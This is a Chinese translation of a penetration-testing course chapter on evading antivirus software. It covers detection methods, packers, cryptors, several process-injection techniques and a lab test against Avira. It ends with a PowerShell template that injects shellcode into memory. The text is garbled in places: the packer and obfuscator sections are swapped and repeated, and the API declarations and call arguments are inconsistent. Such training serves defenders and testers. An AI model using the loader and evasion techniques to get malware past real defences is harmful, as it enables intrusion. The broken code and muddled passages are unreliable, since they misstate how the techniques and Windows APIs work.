
![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_564_0.png)

| 有 51 个引擎检测到此文件 |
|---|---|
| SHA-256 | 235605d1551143e2a4b3d978b529d73b67c3ef5b250353741 |
| 文件名 | Arcarbit |
| 文件大小 | 72.07 KB |
| 最后分析 | 2019-02-28 16:38:29 UTC |

取决于所测试杀毒软件的质量，我们可以通过简单将二进制文件内部几个无害字符串从大写改为小写来绕过杀毒软件。然而，并非所有情况都是如此。

由于杀毒软件使用不同的签名和专利技术来检测恶意软件，且每个厂商都会不断更新其数据库，通常很难找到一种通用的杀毒软件规避解决方案。很多时候，这是在测试环境中通过试错法实现的。

因此，在进行渗透测试时，我们在考虑规避策略之前，必须识别已部署软件的存在、类型和版本。如果客户端网络或系统实施了杀毒软件，我们应该在文件上传到目标机器之前，尽可能收集大量信息，并在实验室环境中还原配置以进行 AV 规避测试。

### 17.2.2 启发式和基于行为的检测

为了解决基于签名的检测缺陷，病毒厂商引入了额外的检测方法来提高其产品的有效性。

启发式检测$^{48}$ 是一种依赖规则和算法判断操作是否为恶意的检测方法。这通常通过遍历二进制文件的指令集，或通过解构和分析源代码来实现。其理念是寻找被认为恶意的各种模式和程序调用（而不是简单的字节序列）。

另一种是基于行为的检测$^{49}$ 动态分析二进制文件的行为。这通常通过在模拟环境（如小型虚拟机）中执行该文件，并寻找被认为恶意的行为或动作来实现。

由于这些技术不需要恶意软件签名，它们可以更有效地识别未知恶意软件或已知恶意软件的变体。鉴于杀毒厂商在启发式和行为检测方面使用不同的实现，每种杀毒产品在哪些代码被视为恶意方面会有所不同。

值得注意的是，大多数杀毒用户使用这些检测方法的组合来获得更高的检测率。

> 48 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Heuristic_analysis
>
> 49 (Tristan Aubrey-Boyden, 2007), https://pdfs.semantics scholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_565_0.png)

PWK 2.0 Copyright © Offensive Security Ltd. 版权所有。 492

## 17.3 绕过杀毒检测

通常来说，杀毒软件规避分为两大类：磁盘内和内存。磁盘规避侧重于物理修改存储在磁盘上的恶意文件，试图规避检测。鉴于 AV 扫描的强大，现代恶意软件通常采用内存操作，完全避免磁盘并降低被检测的概率。在接下来的章节中，我们将对这两种方法中某些技术进行概述。请注意，这些技术超出了本模块的范围。

### 17.3.1 磁盘规避

在讨论规避之前，我们首先查看用于混淆存储在磁盘文件的各种技术。

#### 17.3.1.1 加壳器 (Packers)

现代磁盘恶意软件混淆有多种形式。避免检测的最早期方法之一是使用加壳器。混淆器重新组织并变异代码，使其更难逆向工程。这包括用语义等价指令替换指令、插入无关指令。

“加密器”软件通过加密方式更改可执行代码，添加一个解密存根并在执行时恢复原始代码。这种解密发生在内存中，磁盘上只留下加密代码。加密已成为现代恶意软件的基础，是最高有效的 AV 规避技术之一。

#### 17.3.1.2 混淆器 (Obfuscators)

混淆器重新组织并变异代码，使其更难逆向工程。这包括用语义等价指令替换指令、插入无关指令。在互联网早期，加壳器最初的设计仅是为了缩小可执行文件的大小。与现代“zip”不同，使用加壳器创建的文件不仅更小，而且功能是完整的。

> 410 (Wikipedia, 2019), https://en.wikipedia.org/wiki/executable_compression
>
> 411 (UPX, 2018), https://upx.github.io/
>
> 412 (Wikipedia, 2019), https://en.wikipedia.org/wiki/

#### 17.3.1.3 加密器 (Cryptors)

加密已成为现代恶意软件的基础，是最有效的 AV 规避技术之一。“加密器”软件通过加密更改可执行代码，添加一个解密存根并在执行时恢复原始代码。这种解密发生在内存中，磁盘上只留下加密代码。

#### 17.3.1.4 软件保护 (Software Protectors)

高效的杀毒规避是之前所有技术的结合，包括反逆向、虚拟机检测等。在大多数情况下，软件保护是出于合规目的，但也可以用于绕过杀毒。这些方法看起来简单，但实际上非常复杂。

### 17.3.2 内存规避

存在几种不写入磁盘的规避技术。虽然我们将对某些进行简要说明，但我们将详细介绍内存注入。这种常用方法是利用一组 Windows API 获取进程句柄。获取句柄后，使用 `VirtualAlloc` 等 API 在该进程中分配内存。内存分配后，使用 `WriteProcessMemory` 将恶意负载拷贝到新分配的内存中，通常通过 `CreateThread` 在独立线程中执行。这听起来很复杂，但我们将在示例中使用 PowerShell 目标 `powershell.exe` 实例。

#### 17.3.2.1 进程注入 (Remote Process Injection)

该技术尝试将负载注入到另一个有效的 PE 中。该技术的主要优点是不写入磁盘，而这正是杀毒软件的关注重点。

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_566_0.png)

> 413 (Enigma Protector, 2019), https://www.enigmaprotector.com/en/home
>
> 414 (Endgame, 2017), https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending
>
> 415 (F-Secure, 2018), https://blog.f-secure.com/memory-injection-like-a
>
> 416 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Windows_API
>
> 417 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/desktop/processthreads/nf-processthreads-open-process
>
> 418 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Handle_computing
>
> 419 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
>
> 420 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
>
> 421 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/desktop/processthreads/nf-processthreads-processthreads-createremotethread

# 使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_568_0.png)

#### 17.3.2.2 反射 DLL 注入 (Reflective DLL Injection)

DLL 注入意味着使用 `LoadLibrary` API 从磁盘加载恶意 DLL，与之不同，该技术尝试将攻击者存储在进程中的 DLL 加载到进程中。

实现此技术的主要挑战是 `LoadLibrary` 不支持从内存加载 DLL。此外，Windows 操作系统也没有提供处理此类操作的 API。选择这种技术的开发者必须编写一个不依赖于磁盘 DLL 的 API 版本。

#### 17.3.2.3 进程空空 (Process Hollowing)

在使用进程空空技术来绕过杀毒软件时，攻击者首先启动一个挂起状态的非恶意进程。一旦启动，从内存中移除该进程映像并将其替换为恶意的可执行文件映像。最后，恢复进程并执行恶意代码，而不是合法进程。

#### 17.3.2.4 内联钩子 (Inline hooking)

顾其实名，该技术涉及修改内存并在函数中引入钩子（重定向代码执行的指令），以将执行流指向我们的恶意代码。在执行我们的恶意代码后，执行流将返回到被修改的函数并继续执行，看起来就像只执行了原始代码一样。

### 17.3.3 AV 规避：实例实例

现在，我们已经对杀毒软件使用的检测技术和相应的绕过方法有了通用的理解，我们可以转向实际示例了。

要找到一个绕过所有杀毒软件的通用解决方案是困难且耗时的，甚至可能是不可能的。考虑到渗透测试期间的时间限制，针对客户端网络中部署的特定杀毒软件进行攻击更为高效。

为了本模块的目的，我们将在 Windows 10 客户端上安装 Avira Free Antivirus 版本 15.0.34.16。Avira 安装程序可以在 `C:\tools\antivirus_evasion\` 目录下找到。安装后，我们可以通过在 Windows 10 搜索栏中搜索“Start Avira Antivirus”来检查其配置：

> 422 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/loadlibrary/nf-loadlibrarylibrary
>
> 423 (Andrea Fortuna, 2017), https://www.andreafortuna.com/2017/07/12/what-is-reflective-dll-injection-and-how-can-be-detected/
>
> 424 (Mytandas Baranuskas, 2019), https://github.com/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved.

图 264：在搜索栏中搜索“Start Avira Antivirus”。

启动此应用程序将显示 Avira 控制中心，我们可以在其中验证实时防护（Real-Time Protection）功能是否启用，如果没有启用，我们可以手动启用：

图 265：Avira 控制中心。

作为第一步，我们应该验证杀毒软件是否按预期工作。我们将使用之前生成的 meterpreter 负载并用 Avira 对其进行扫描。

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_569_0.png)

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 496

在将恶意 PE 传输我们的 Windows 客户端后，我们将尝试运行该二进制文件并观察结果。

列表 497 - Avira 阻止了恶意 PE 的执行。

在这种情况下，我们看到一个错误消息，指示系统无法执行我们的文件。随后，Avira 会显示一个弹出窗通知，告知该文件已被标记为恶意并已隔离。

图 266：Avira Free Antivirus 弹出窗口。

#### 17.3.3.1 PowerShell 内存注入

根据我们的目标环境及其限制程度，我们可能能够绕过杀毒软件

> 445(Microsoft, 2017). https://docs.microsoft.com/en-us/powershell/scripting/getting-started/getting-started-with-windows-powershell?view=powershell-6

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_570_0.png)

```
C:\Users\offsec\Desktop> dir Volume in drive C has no label. Volume Serial Number is 56B9-BB74
```

C:\Users\offsec\Desktop 

```
02/26/2018 10:20 AM 02/26/2018 10:20 AM 02/26/2018 06:16 AM 02/26/2018 05:55 AM

<DIR> <DIR>
.\.
73,802 binary.exe
799 Windows 10 Update Assistant.lnk

3 File(s)
3 Dir(s)

75,647 bytes 4,216,208 bytes free
```

```
C:\Users\offsec\Desktop> binary.exe
The system cannot execute the specified program.
```

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_570_1.png)

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 497

在此示例中，我们将使用与远程进程注入类似的技术。主要区别在于我们的目标是正在执行的进程（在本例中是 PowerShell 解释器）。此外，即使脚本被标记为恶意，也可以被轻易修改。杀毒软件会查看名称、注释和逻辑，而这些都可以编译。PowerShell 的一个非常强大的特性是它可以与 Windows API 交互，从而实现内存注入。执行脚本而不是 PE 的主要优点之一是，杀毒软件很难判断脚本是否恶意，因为它运行在解释器内部且脚本本身是执行的。尽管如此，请记住某些杀毒软件处理恶意脚本方面的效果更好。

在下面的列表中，我们看到一个执行内存注入的基础模板：

```powershell
$code = '
[DllImport("kernel32.dll")]
public static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocType);

[DllImport("kernel32.dll")]
public static IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwSize, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThread);

[DllImport("msvcrt.dll")]
public static extern int memset(IntPtr dest, IntPtr src, uint count);
';

$winFunc = Add-Type -MemberDefinition $code -Name "Win32" -Namespace Win32 -PassThru
[byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc($null, 0, $size, 0x4000);
for ($i=0; $i -le($sc.Length-1); $i++) {$winFunc::memset([IntPtr]$x.Add($i), [IntPtr]($sc[$i]), 1)};

$winFunc::CreateThread(0,0,0,0,0); 
```

列表 4 - 用于 PowerShell 的内存负载脚本

使用 Kali Linux 2.0 进行渗透测试

# 攻击

脚本首先使用来自 `kernel32.dll` 的 `VirtualAlloc` 和 `CreateThread` 以及来自 `msvcrt.dll` 的 `memset`。这些函数分别允许我们分配内存、创建执行线程并向分配的内存写入任意数据。再次注意，我们是在当前进程（`powershell.exe`）中执行新线程，而不是远程线程。

```csharp
[DllImport("kernel32.dll")]
public static IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocType, uint protect);
```

```csharp
[DllImport("kernel32.dll")]
public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId, IntPtr lpThread);
```
